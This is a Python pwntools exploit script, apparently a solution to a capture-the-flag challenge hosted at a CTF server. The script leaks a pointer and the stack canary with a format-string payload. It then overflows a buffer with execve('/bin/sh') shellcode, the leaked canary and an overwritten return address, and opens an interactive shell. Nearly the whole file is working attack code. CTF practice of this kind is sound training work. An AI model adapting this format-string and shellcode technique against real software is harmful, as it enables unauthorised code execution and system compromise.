#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './challenge'
host = 'chal.fallctf.sigpwny.com'
port = 5004

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.recvuntil(b"Hey, what's your name?\n")

io.sendline(b'%p %15$p')

io.recvuntil(b"Hello, ")

leaks = io.recvline().split()
place_addr = int(leaks[0], 16) + 0x2140
canary = int(leaks[1], 16)
log.info("canary: %#x", canary)
log.info("place_addr: %#x", place_addr)

exploit = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
exploit += b"A" * (0x28 - len(exploit))
exploit += p64(canary)
exploit += b"A" * 8
exploit += p64(place_addr)

io.sendline(exploit)

io.interactive()

